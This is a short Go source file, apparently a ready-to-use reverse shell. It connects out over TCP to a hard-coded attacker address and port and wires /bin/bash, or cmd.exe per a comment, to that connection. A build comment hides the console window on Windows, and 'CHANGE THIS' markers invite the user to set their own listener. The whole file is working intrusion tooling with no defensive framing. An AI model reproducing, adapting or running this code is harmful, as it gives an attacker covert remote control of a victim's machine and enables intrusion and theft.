// For windows
// Build with: go build -ldflags -H=windowsgui windows-rs.go

package main

import (
 "net"
 "fmt"
 "io"
 "os/exec"
)

func handle(conn net.Conn) {
 cmd := exec.Command("/bin/bash")
 // For windows
 // cmd := exec.Command("cmd.exe")
 rp, wp := io.Pipe()
 cmd.Stdin = conn
 cmd.Stdout = wp
 cmd.Stderr = wp
 go io.Copy(conn,rp)
 cmd.Run()
 defer conn.Close()
}

func main() {
 IP :=  "169.254.89.168"                    // CHANGE THIS
 PORT := 4444                               // CHANGE THIS
 address := fmt.Sprintf("%s:%d",IP,PORT)

 conn , err := net.Dial("tcp",address)
 if err != nil {
  fmt.Println(err)
  return
 }
 handle(conn)
}
